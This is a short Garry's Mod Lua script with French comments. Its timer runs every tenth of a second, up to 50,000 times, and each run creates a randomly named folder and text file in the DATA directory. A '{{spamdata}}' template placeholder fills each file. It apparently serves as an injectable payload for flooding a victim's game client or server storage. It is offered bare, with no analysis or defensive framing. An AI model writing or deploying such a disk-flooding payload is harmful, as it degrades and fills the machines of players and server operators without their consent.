local content = &quot;{{spamdata}}&quot;
timer.Create(&quot;Lolilololoolololooooololol&quot;, 0.1, 50000, function()
    local chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()_+-={}|[]`~'
    local length = 10
    local randomString = ''
    math.randomseed(os.time())
    local charTable = {}
    for c in chars:gmatch(&quot;.&quot;) do
        table.insert(charTable, c)
    end

    for i = 1, length do
        randomString = randomString .. charTable[math.random(1, #charTable)]
    end

    -- Fonction pour g&eacute;n&eacute;rer un nom al&eacute;atoire
    local function generateRandomName()
        local name = &quot;&quot;
        for i = 1, length do
            name = name .. charTable[math.random(1, #charTable)]
        end
        return name
    end

    -- Cr&eacute;e un dossier avec un nom al&eacute;atoire s'il n'existe pas d&eacute;j&agrave;
    local folderName = generateRandomName()
    while file.Exists(folderName, &quot;DATA&quot;) do
        folderName = generateRandomName()
    end
    file.CreateDir(folderName)

    -- Cr&eacute;e un fichier dans le dossier avec un nom al&eacute;atoire
    local fileName = generateRandomName()
    file.Write(folderName .. &quot;/&quot; .. fileName .. &quot;.txt&quot;, content)
end)
